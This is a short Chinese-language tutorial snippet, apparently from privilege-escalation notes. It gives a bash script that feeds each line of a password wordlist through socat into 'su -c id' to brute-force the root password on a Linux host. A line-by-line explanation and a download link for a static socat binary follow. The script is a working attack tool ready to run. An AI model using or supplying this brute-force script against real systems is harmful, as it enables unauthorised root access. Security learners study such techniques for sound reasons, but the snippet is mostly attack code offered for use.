```
#!/bin/bash

for i in `cat 300.txt`
do
  			echo "passwd:$i"
        (sleep 0.1;echo "$i")|./socat - EXEC:'bash -c "su -c id"',pty

done
```

解析：

- for i in \`cat 300.txt\`
  - 逐行读取300.txt字典文件
- echo "passwd:$i"
  - 显示当前进度
- (sleep 0.1;echo "$i")|./socat - EXEC:'bash -c "su -c id"',pty
  - (sleep 0.1;echo "$i")
    - 一个子shell
    - sleep 0.1 暂停0.1秒
    - 输出文件当前行内容
  - |
    - 将前面的输出通过管道给后面的命令
  - ./socat
    - 运行socat工具（一个网络工具），后面跟参数
  - -
    - 表示标准输入输出
  - EXEC:'bash -c "su -c id"'
    - 执行命令
    - su -c id
      - 以root身份执行id
  - pty
    - 使用伪终端







静态socat下载地址

```
https://github.com/andrew-d/static-binaries/raw/master/binaries/linux/x86_64/socat
```

